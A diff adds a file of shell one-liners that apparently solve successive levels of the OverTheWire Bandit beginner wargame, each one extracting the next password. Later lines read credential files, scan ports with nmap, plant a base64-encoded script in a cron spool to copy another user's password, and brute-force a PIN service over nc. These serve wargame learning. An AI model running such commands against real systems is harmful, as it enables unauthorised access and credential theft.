@@ -1,0 +1,25 @@
+cat ./readme
+cat ./-
+cat "spaces in this filename"
+cat inhere/.hidden
+cat inhere/-file07
+find . -type f ! -executable -size 1033c -exec cat {} \; | tr -d ' '
+find / -user bandit7 -group bandit6 2>/dev/null -exec cat {} \;
+grep "millionth" ./data.txt  | xargs echo | cut -d ' ' -f 2
+sort ./data.txt | uniq -u
+strings data.txt | grep "==" | tail -n 1 | cut -d ' ' -f 2
+cat data.txt | base64 -d | cut -d ' ' -f 4
+cat data.txt | tr a-zA-Z n-za-mN-ZA-M | cut -d ' ' -f 4
+xxd -r data.txt | zcat | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat | cut -d ' ' -f 4
+ssh -i sshkey.private bandit14@localhost -p2220 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -q cat /etc/bandit_pass/bandit14
+cat /etc/bandit_pass/bandit14 | nc localhost 30000 | tail -n2 | tr -d '\n'
+cat /etc/bandit_pass/bandit15 | openssl s_client -ign_eof -connect localhost:30001 -quiet 2>/dev/null | tail -n2 | tr -d '\n'
+id_rsa=$(mktemp) && valid_port=$(ports=$(nmap --min-rate 5000 -Pn -n -p31000-32000 localhost | grep -oP '\d{1,5}/tcp' | sed 's/\/tcp//g' | xargs | tr ' ' ',') && IFS=","; for p in $ports ; do echo test |timeout 3 openssl s_client -ign_eof -connect localhost:$p -quiet 2>/dev/null | grep "Wrong" > /dev/null && echo $p; done) || cat /etc/bandit_pass/bandit16 | openssl s_client -ign_eof -connect localhost:$valid_port -quiet 2>/dev/null | tail -n +2 > $id_rsa && chmod 600 $id_rsa && ssh -i $id_rsa bandit17@localhost -p2220 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null 2>/dev/null cat /etc/bandit_pass/bandit17
+diff passwords.new passwords.old | grep "<" | awk '{print $2}'
+cat readme
+./bandit20-do cat /etc/bandit_pass/bandit20
+cat /etc/bandit_pass/bandit20 | nc -l 6127 & sleep 5 && ./suconnect 6127 >/dev/null | tail -n1
+cat `grep "cat" /usr/bin/cronjob_bandit22.sh | cut -d ' ' -f 4`
+cat /tmp/`echo I am user bandit23 | md5sum | cut -d ' ' -f 1`
+b24="/tmp/ah1j2uhjzuas8123" && cd /var/spool/bandit24/foo/ && echo Y2F0IC9ldGMvYmFuZGl0X3Bhc3MvYmFuZGl0MjQgPiAvdG1wL2FoMWoydWhqenVhczgxMjMK | base64 -d > b24.sh && chmod 777 b24.sh && while [ ! -f $b24 ]; do sleep 1; done && cat $b24
+PASS_BANDIT24=$(cat /etc/bandit_pass/bandit24) && pins=$(mktemp) && for i in {0000..9999}; do echo "$PASS_BANDIT24 $i" >> $pins; done && cat $pins | nc localhost 30002 -q 2 | grep -vE "Wrong|I am|Correct|Exiting" | grep "password" | cut -d ' ' -f 7
